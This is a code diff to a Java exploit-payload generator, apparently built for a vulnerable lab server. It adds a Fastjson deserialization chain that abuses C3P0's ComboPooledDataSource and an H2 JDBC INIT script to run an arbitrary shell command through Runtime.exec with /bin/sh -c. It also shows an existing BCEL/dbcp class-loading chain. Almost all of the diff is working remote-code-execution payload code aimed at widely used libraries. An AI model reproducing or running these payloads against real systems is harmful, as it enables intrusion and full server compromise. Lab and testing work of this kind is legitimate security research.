@@ -34,6 +34,9 @@ public class FastjsonChainHandler implements ChainHandler {
             // BCEL: delegate class generation to CustomBytecodeHandler (Javassist), then BCEL-encode
             // jchains_fastjson_bcel also routed here — java-chains generates non-@type format
             case "fastjson_bcel", "jchains_fastjson_bcel"   -> bcelJson(bcelDriverClassName(cmd, params));
+            // C3P0 + H2 JDBC INIT script RCE: Fastjson instantiates ComboPooledDataSource,
+            // VulnLabServer calls getConnection() → H2 INIT runs → alias executes cmd
+            case "jchains_fastjson_c3p0_h2"                 -> c3p0H2Json(cmd);
             default -> throw new IllegalArgumentException("Unknown Fastjson chain: " + chainId);
         };
 
@@ -76,6 +79,28 @@ public class FastjsonChainHandler implements ChainHandler {
             "{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\"," +
             "\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}," +
             "\"driverClassName\":\"%s\"}", jsonEsc(driverClassName));
+    }
+
+    /**
+     * C3P0 ComboPooledDataSource + H2 JDBC INIT script RCE.
+     * Fastjson instantiates ComboPooledDataSource → VulnLabServer calls getConnection()
+     * → H2 processes INIT script → CREATE ALIAS + CALL executes cmd.
+     * Dollar-quoting ($$...$$) preserves internal semicolons in alias body.
+     */
+    private String c3p0H2Json(String cmd) {
+        String dbId = Long.toHexString(System.nanoTime()).substring(0, 8);
+        String aliasBody = "void oobx(String c) throws Exception {"
+            + " Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",c}); }";
+        String jdbcUrl = "jdbc:h2:mem:oobx" + dbId + ";"
+            + "TRACE_LEVEL_SYSTEM_OUT=3;"
+            + "INIT=CREATE ALIAS IF NOT EXISTS OOBX AS $$" + aliasBody + "$$\\;"
+            + "CALL OOBX('" + cmd.replace("'", "\\'") + "')";
+        return String.format(
+            "{\"@type\":\"com.mchange.v2.c3p0.ComboPooledDataSource\"," +
+            "\"driverClass\":\"org.h2.Driver\"," +
+            "\"jdbcUrl\":\"%s\"," +
+            "\"user\":\"sa\",\"password\":\"\"}",
+            jsonEsc(jdbcUrl));
     }
 
     private static String jsonEsc(String s) {
